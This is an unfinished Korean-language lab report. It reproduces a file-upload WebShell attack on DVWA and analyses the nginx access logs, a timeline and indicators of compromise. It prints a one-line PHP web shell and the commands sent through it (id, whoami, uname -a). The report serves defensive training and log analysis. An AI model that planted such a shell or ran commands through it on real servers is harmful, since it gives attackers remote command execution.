# Incident 05 - DVWA WebShell Attack Analysis

## 1. 사건 개요

본 분석은 DVWA(Damn Vulnerable Web Application) 환경에서 File Upload 취약점을 이용하여  
WebShell 업로드 및 명령 실행 공격(RCE)을 재현하고, 웹 서버 로그를 기반으로 공격 행위를 분석하기 위한 실습이다.

공격자는 업로드 기능의 검증 미흡을 악용하여 PHP 기반 WebShell을 서버에 업로드하고,  
HTTP 요청을 통해 명령을 전달하여 서버에서 실행할 수 있는 가능성을 확인한다.

본 보고서에서는 공격 재현 과정, 웹 로그 분석, 타임라인 재구성 및 IOC(침해 지표)를 기반으로  
공격 흐름을 분석할 예정이다.

---

## 2. 분석 환경

| 구분 | 환경 |
|------|------|
| Target | RHEL |
| Attacker | Kali Linux |
| Web Server | nginx |
| Web Application | DVWA |
| 주요 로그 | /var/log/nginx/access.log |

---

## 3. 공격 재현 과정

### 3.1 WebShell 업로드

DVWA의 File Upload 기능을 이용하여 PHP 기반 WebShell을 생성하고 업로드하였다.

```php
<?php system($_GET['cmd']); ?>
```

해당 코드는 URL 파라미터(`cmd`)를 통해 전달된 명령을 서버에서 실행하는 기능을 수행한다.

생성한 `shell.php` 파일을 DVWA File Upload 페이지를 통해 업로드하였으며, 업로드 성공 메시지를 확인하였다.

업로드된 파일은 `/hackable/uploads/` 경로에 저장되었으며, 해당 경로를 통해 직접 접근이 가능함을 확인하였다.

---

### 3.2 명령 실행 (RCE)

업로드된 WebShell에 접근하여 URL 파라미터를 통해 시스템 명령을 실행하였다.

다음과 같은 요청을 통해 명령 실행을 확인하였다.

- `?cmd=id`
- `?cmd=whoami`
- `?cmd=uname -a`

각 요청에 대해 서버에서 명령이 정상적으로 실행되었으며, 결과가 브라우저에 출력되는 것을 확인하였다.

이를 통해 업로드된 WebShell을 이용한 원격 명령 실행(Remote Command Execution, RCE)이 가능함을 확인하였다.

---

## 4. 웹 로그 분석 결과

### 4.1 Access Log 분석

웹 서버의 `access.log`를 분석한 결과, WebShell 접근 및 명령 실행 요청이 확인되었다.

확인된 주요 로그는 다음과 같다.

```text
[23/Mar/2026:09:19:35 +0900] GET /hackable/uploads/shell.php?cmd=id
[23/Mar/2026:10:08:58 +0900] GET /hackable/uploads/shell.php?cmd=whoami
[23/Mar/2026:10:10:38 +0900] GET /hackable/uploads/shell.php?cmd=uname%20-a
```

해당 요청은 일반적인 웹 요청과 달리 `cmd` 파라미터를 포함하고 있으며, 서버에서 명령 실행을 시도하는 비정상적인 접근 패턴이다.

---

### 4.2 주요 공격 패턴 분석

공격 요청의 주요 특징은 다음과 같다.

- 업로드된 PHP 파일(`shell.php`)에 직접 접근
- `cmd` 파라미터를 통해 시스템 명령 전달
- GET 요청을 이용한 반복적인 명령 실행 시도

이와 같은 패턴은 정상적인 사용자 요청에서는 발생하지 않으며, WebShell을 이용한 침해 행위로 판단할 수 있다.

---

## 5. 타임라인 재구성

| 시간 | 이벤트 | 근거 로그 | 해석 |
|------|--------|-----------|------|
| 09:19:35 | 명령 실행 (id) | GET /hackable/uploads/shell.php?cmd=id | 사용자 정보 확인 |
| 10:08:58 | 명령 실행 (whoami) | GET /hackable/uploads/shell.php?cmd=whoami | 실행 계정 확인 |
| 10:10:38 | 시스템 정보 수집 | GET /hackable/uploads/shell.php?cmd=uname -a | 시스템 정보 확인 |

---

## 6. IOC (Indicators of Compromise)

| 구분 | 값 | 설명 |
|------|----|------|
| URL | (작성 예정) | WebShell 접근 경로 |
| Parameter | cmd= | 명령 실행 파라미터 |
| Command | (작성 예정) | 실행된 시스템 명령 |
| Pattern | (작성 예정) | WebShell 접근 패턴 |
| Directory | /hackable/uploads/ | 업로드 파일 저장 경로 |

---

## 7. 대응 및 개선 방안
(작성 예정)

- 파일 업로드 검증 강화
- 업로드 디렉토리 실행 권한 제한
- 웹 로그 모니터링 및 이상 탐지
- 입력값 필터링 및 보안 정책 적용

---

## 8. 결론
(작성 예정)
